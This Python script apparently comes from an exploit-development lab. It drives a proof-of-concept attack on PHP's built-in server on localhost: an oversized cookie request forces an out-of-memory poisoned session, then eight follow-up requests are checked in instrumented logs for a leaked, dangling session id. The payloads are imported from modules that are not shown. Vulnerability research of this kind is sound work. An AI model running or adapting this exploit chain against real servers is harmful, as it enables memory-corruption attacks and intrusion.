#!/usr/bin/env python3
"""Single-worker pinning: the PoC's pipeline, emulated without pipelining.

Why this experiment
-------------------
step5_pipeline.py proved php -S cannot pipeline: sending even two small GETs in
one sendall yields zero responses. So the reference PoC's 9-request single-write
(1 producer + 8 consumers) cannot be replayed literally against php -S.

What the pipeline is actually for is worker pinning. In the PoC's lab the client
talks to nginx, which holds one keep-alive upstream connection to the PHP server,
so the poisoned worker is guaranteed to serve all eight consumers. Our lab opens
a fresh TCP connection per request, so a consumer can land on a worker that never
saw the OOM - which would read a perfectly healthy session id. That is exactly
the "healthy-id" verdict seen for the byte-identical P-NUL+C-a configuration.

So: run php -S with PHP_CLI_SERVER_WORKERS=1 and send the same 1+8 request
sequence sequentially. A single worker makes pinning deterministic without any
pipelining, which isolates "worker reuse" from "request geometry".

The producer MUST carry the COOKIE_PAIRS header set: without those extra cookies
the request parses in well under memory_limit and never OOMs, so no poison is
left behind and every consumer reads a healthy 32-byte id. A first version of
this script omitted them and measured exactly that: 16/16 healthy ids.

Reported per consumer index: the A0 verdict. Win = len 16 with first qword 16.
"""
import io
import json
import os
import re
import subprocess
import sys
import time

sys.path[:0] = ["/opt/data/php2shell-lab", "/opt/data/lab-scratch",
                "/tmp/StealMyBitcoin-PoC"]
import stealmybitcoin_poc as P            # noqa: E402
import step4_reach as R                   # noqa: E402
import stage2 as S2                       # noqa: E402
import step4_fitsweep as F                # noqa: E402

EVID = "/opt/data/lab-scratch/worker1-logs"
PORT = 19220

A0 = re.compile(
    r"\[INSTR-A0\] entry PS\(id\)=0x([0-9a-f]+) val=0x([0-9a-f]+) len=(\d+) "
    r"gc_refcount=(\d+) gc_type=0x([0-9a-f]+) send_cookie=(\d+) headers_sent=(\d+)")
BYTES = re.compile(r"\[INSTR-A0\] bytes\((\d+)\): ((?:[0-9a-f]{2} ?)+)")


def a0_records(path, start):
    text = io.open(path, "rb").read()[start:].decode("latin-1")
    recs, cur = [], None
    for line in text.splitlines():
        m = A0.search(line)
        if m:
            cur = dict(addr=int(m.group(1), 16), val=int(m.group(2), 16),
                       len=int(m.group(3)), rc=int(m.group(4)),
                       gctype=int(m.group(5), 16), send_cookie=int(m.group(6)),
                       headers=int(m.group(7)), bytes=None)
            recs.append(cur)
            continue
        b = BYTES.search(line)
        if b and cur is not None and cur["bytes"] is None:
            cur["bytes"] = bytes.fromhex(b.group(2).replace(" ", ""))
    return recs


def start_one_worker(port):
    log = open(R.LOG, "wb")
    env = dict(os.environ, PHP_CLI_SERVER_WORKERS="1")
    p = subprocess.Popen(
        [R.PHP, "-d", "display_errors=1", "-d", "error_reporting=E_ALL",
         "-S", "127.0.0.1:%d" % port, "-t", R.WWW],
        stdout=log, stderr=log, env=env, start_new_session=True)
    for _ in range(80):
        time.sleep(0.25)
        try:
            S2.send(port, S2.body([S2.part(b"PHPSESSID", b"a")]))
            return p
        except OSError:
            continue
    raise SystemExit("server did not come up on %d" % port)


def main():
    reps = 2
    if "--reps" in sys.argv:
        reps = int(sys.argv[sys.argv.index("--reps") + 1])
    os.makedirs(EVID, exist_ok=True)
    stage = P.STAGES["code"]
    prod = P.leak_producer(stage.producer)
    cons = stage.build_consumer()
    print("single-worker pinning: 1 producer + %d consumers, sequential"
          % P.CONSUMERS)
    leaks = 0
    for rep in range(reps):
        port = PORT + rep
        srv = start_one_worker(port)
        try:
            size0 = os.path.getsize(R.LOG)
            raw = S2.send(port, prod, cookies=S2.COOKIE_PAIRS)
            time.sleep(0.4)
            logtxt = io.open(R.LOG, "rb").read().decode("latin-1")
            oom = "Allowed memory size" in logtxt
            print("\n== rep %d port %d" % (rep, port))
            print("   producer -> %d B  first line=%r  oom=%s" % (
                len(raw or b""), (raw or b"").split(b"\r\n")[0][:40], oom))
            for i in range(P.CONSUMERS):
                base = len(io.open(R.LOG, "rb").read())
                r = S2.send(port, cons)
                time.sleep(0.25)
                recs = a0_records(R.LOG, base)
                sid = S2.session_id(r) if r else None
                verdict = "NO DEREF"
                detail = ""
                if recs:
                    a = recs[-1]
                    verdict = "len=%d" % a["len"]
                    bs = a["bytes"] or b""
                    first = " ".join("%02x" % x for x in bs[:16])
                    detail = "sc=%d hs=%d type=0x%x bytes=%s" % (
                        a["send_cookie"], a["headers"], a["gctype"], first)
                    if a["len"] == 16 and bs[:8] == b"\x10" + b"\x00" * 7:
                        verdict = "WIN len=16 qword=16"
                        leaks += 1
                print("   consumer[%d] wire=%-22r %-16s %s" % (
                    i + 1, F.wire_verdict(sid), verdict, detail))
                with open(os.path.join(EVID, "rep%d-c%d.log" % (rep, i + 1)), "wb") as fh:
                    fh.write(io.open(R.LOG, "rb").read())
        finally:
            R.stop_server(srv)
    print("\n=== worker1 done reps=%d wins=%d ===" % (reps, leaks))
    return 0


if __name__ == "__main__":
    sys.exit(main())
